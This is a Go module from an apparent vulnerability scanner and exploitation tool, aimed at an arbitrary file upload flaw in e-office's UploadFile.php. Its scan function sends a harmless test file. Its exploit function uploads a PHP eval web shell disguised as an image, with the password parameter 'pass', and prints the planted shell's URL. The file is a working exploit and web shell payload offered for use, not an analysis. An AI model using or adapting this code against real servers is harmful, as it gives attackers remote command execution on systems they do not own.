package vulners

import (
	"bytes"
	"github.com/fatih/color"
	"github.com/imroc/req/v3"
	"io"
	"strings"
)

type Wo04 struct {
}

func (s *Wo04) Scan(targetUrl string) {
	vulnerable, err := Wo04scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Wo04] 存在UploadFile 任意文件上传")
	} else {
		color.White("[Wo04] 不存在UploadFile 任意文件上传")
	}
}

func (*Wo04) Exploit(targetUrl string) {
	runResult, err := Wo04runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Wo04scancore(targetUrl string) (bool, error) {
	url := "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
	data := []byte("helloword")
	resp, err := baseClient.NewRequest().SetFileUpload(req.FileUpload{
		ParamName: "Filedata",
		FileName:  "1ndex.png",
		GetFileContent: func() (io.ReadCloser, error) {
			return io.NopCloser(bytes.NewBuffer(data)), nil
		},
		FileSize:    int64(len(data)),
		ContentType: "image/jpeg",
	}).Post(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "eoffice") {
		return true, nil
	} else {
		return false, nil
	}
}

func Wo04runcore(targetUrl string) (string, error) {
	url := "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
	data := []byte("<?php @eval($_GET['pass']);?>")
	resp, err := baseClient.NewRequest().SetFileUpload(req.FileUpload{
		ParamName: "Filedata",
		FileName:  "1ndex.php",
		GetFileContent: func() (io.ReadCloser, error) {
			return io.NopCloser(bytes.NewBuffer(data)), nil
		},
		FileSize:    int64(len(data)),
		ContentType: "image/jpeg",
	}).Post(targetUrl + url)
	if err != nil {
		return "", err
	}
	resContent := resp.String()

	if strings.Contains(resContent, "eoffice") {
		return "存在UploadFile 任意文件上传 webshell地址:\n" + targetUrl + "/images/logo/logo-eoffice.php", nil
	} else {
		return "", nil
	}
}
